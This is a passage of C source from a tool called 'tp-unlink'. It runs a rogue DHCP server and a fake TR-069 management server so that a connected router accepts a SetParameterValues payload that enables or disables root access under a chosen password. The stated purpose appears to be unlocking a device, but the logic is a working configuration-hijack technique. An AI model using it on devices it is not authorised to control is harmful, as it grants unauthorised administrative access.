        if (step && time(NULL) - step_time > 8) {
            step = 0;
            step_time = time(NULL);
            dbg("sequence reset");
        }

        if (waitfd(fd, 200) <= 0) continue;

        struct sockaddr_in client;
        socklen_t clen = sizeof client;
        sock_t c = accept(fd, (void *)&client, &clen);
        if (BAD(c)) continue;

#ifdef _WIN32
        DWORD tv = 2000;
        setsockopt(c, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof tv);
#else
        struct timeval tv = {2, 0};
        setsockopt(c, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
#endif

        char buf[16384] = {0};
        int total = 0, content_len = -1, header_len = 0;
        time_t recv_start = time(NULL);

        while (total < (int)sizeof buf - 1) {
            if (time(NULL) - recv_start > 5) break;
            int r = recv(c, buf + total, (int)sizeof buf - 1 - total, 0);
            if (r < 0) { if (sockerr() == EINTR_) continue; break; }
            if (r == 0) break;
            total += r;

            if (content_len < 0) {
                char *eoh = strstr(buf, "\r\n\r\n");
                if (eoh) {
                    header_len = (int)(eoh - buf) + 4;
                    char *cl = strstr(buf, "Content-Length:");
                    if (cl) {
                        cl += 15;
                        while (*cl == ' ') cl++;
                        content_len = atoi(cl);
                    } else content_len = 0;
                }
            }
            if (content_len >= 0 && total >= header_len + content_len) break;
            if (strstr(buf, "</SOAP-ENV:Envelope>") || strstr(buf, "</s:Envelope>")) break;
        }

        if (total == 0) { close(c); continue; }

        if (strstr(buf, "Inform")) {
            atomic_store(&g_state, 1);
            step_time = time(NULL);
            dbg("inform");

            if (g_dry) {
                logmsg("dry run ok");
                atomic_store(&g_state, 3);
                safesend(c, HTTP_204, sizeof HTTP_204 - 1);
                atomic_store(&g_quit, 1);
            } else {
                const char *resp = (g_disable || step == 1) ? payload : getparam;
                if (!g_disable && step == 0) step = 1; else step = 2;
                sendhttp(c, resp, (int)strlen(resp));
            }
        } else if (step == 1 && strstr(buf, "GetParameterValuesResponse")) {
            step_time = time(NULL);
            dbg("got params");
            char *body = strstr(buf, "<?xml");
            if (body) save_backup(body);

            if (parse_enabled(buf) == 1) {
                logmsg("already enabled");
                atomic_store(&g_state, 2);
                safesend(c, HTTP_204, sizeof HTTP_204 - 1);
                atomic_store(&g_quit, 1);
            } else {
                sendhttp(c, payload, (int)strlen(payload));
                step = 2;
            }
        } else if (step == 2 && strstr(buf, "SetParameterValuesResponse")) {
            dbg("success");
            atomic_store(&g_state, 3);
            safesend(c, HTTP_204, sizeof HTTP_204 - 1);
            atomic_store(&g_quit, 1);
        } else {
            safesend(c, HTTP_204, sizeof HTTP_204 - 1);
        }
        close(c);
    }
    close(fd);
    THRD_END;
}

static void usage(const char *prog) {
    printf("usage: %s [options] <password>\n"
           "  -i <iface>   network interface\n"
           "  -S <ip>      server IP (default 10.116.13.100)\n"
           "  -C <ip>      client IP (default 10.116.13.20)\n"
           "  -p <port>    ACS port (default 7547)\n"
           "  -t <sec>     timeout (default 30)\n"
           "  -s <slot>    user slot (default 2)\n"
           "  -b <file>    backup filename\n"
           "  -d           disable root access\n"
           "  -x           keep CWMP enabled\n"
           "  -n           dry run\n"
           "  -v           verbose\n"
           "  -V           version\n", prog);
    exit(1);
}

int main(int argc, char **argv) {
    setlocale(LC_ALL, "");

    int opt;
    while ((opt = getopt(argc, argv, "i:S:C:p:t:s:b:dxvnVh")) != -1) {
        switch (opt) {
        case 'i': strncpy(g_if, optarg, sizeof g_if - 1); break;
        case 'S': chkip(optarg); strncpy(g_srv, optarg, sizeof g_srv - 1); break;
        case 'C': chkip(optarg); strncpy(g_cli, optarg, sizeof g_cli - 1); break;
        case 'p': g_port = intarg(optarg, 1, 65535); if (g_port < 0) { logmsg("bad port"); return 1; } break;
        case 't': g_tmo = intarg(optarg, 1, 3600); if (g_tmo < 0) { logmsg("bad timeout"); return 1; } break;
        case 's': g_slot = intarg(optarg, 1, 255); if (g_slot < 0) { logmsg("bad slot"); return 1; } break;
        case 'b': strncpy(g_bak, optarg, sizeof g_bak - 1); break;
        case 'd': g_disable = 1; break;
        case 'x': g_keep = 1; break;
        case 'v': g_verbose = 1; break;
        case 'n': g_dry = 1; break;
        case 'V': puts("tp-unlink v1"); return 0;
        default: usage(argv[0]);
        }
    }

    platform_init();

    if (!g_if[0]) find_iface();
    if (!g_if[0]) { logmsg("no interface found"); return 1; }
    if (!check_iface()) { logmsg("interface not found: %s", g_if); return 1; }

    if (!g_disable) {
        if (optind >= argc) usage(argv[0]);
        strncpy(g_pw, argv[optind], sizeof g_pw - 1);
        if (!g_pw[0] || strlen(g_pw) > 32) { logmsg("bad password"); return 1; }
    }

#ifdef _WIN32
    if (!IsUserAnAdmin()) { logmsg("need admin"); return 1; }
#else
    if (getuid()) { logmsg("need root"); return 1; }
#endif

    struct in_addr s, c, m;
    inet_pton(AF_INET, g_srv, &s);
    inet_pton(AF_INET, g_cli, &c);
    inet_pton(AF_INET, "255.255.255.0", &m);
    if ((s.s_addr & m.s_addr) != (c.s_addr & m.s_addr)) {
        logmsg("server/client not in same subnet");
        return 1;
    }

    printf("tp-unlink v1 | %s | %s\n", g_if, g_dry ? "dry" : g_disable ? "disable" : "enable");

    set_ip();
    g_start = time(NULL);

    thrd_t t_dhcp, t_acs;
    if (!start_dhcp(&t_dhcp) || !start_acs(&t_acs)) {
        logmsg("thread start failed");
        atomic_store(&g_quit, 1);
        slp(100);
        restore_ip();
        return 1;
    }

    while (!atomic_load(&g_quit) && time(NULL) - g_start < g_tmo)
        slp(100);

    atomic_xchg(&g_quit, 1);
    int state = atomic_load(&g_state);
    slp(state == 3 ? 2000 : 500);

    wait_thread(t_acs);
    wait_thread(t_dhcp);
    restore_ip();
    platform_fini();

    if (atomic_load(&g_portbusy)) { logmsg("port busy"); return 1; }

    switch (state) {
    case 3: logmsg("success"); return 0;
    case 2: return 4;
    case 1: case 4: return 3;
    case 0: return 2;
    default: return 1;
    }
}
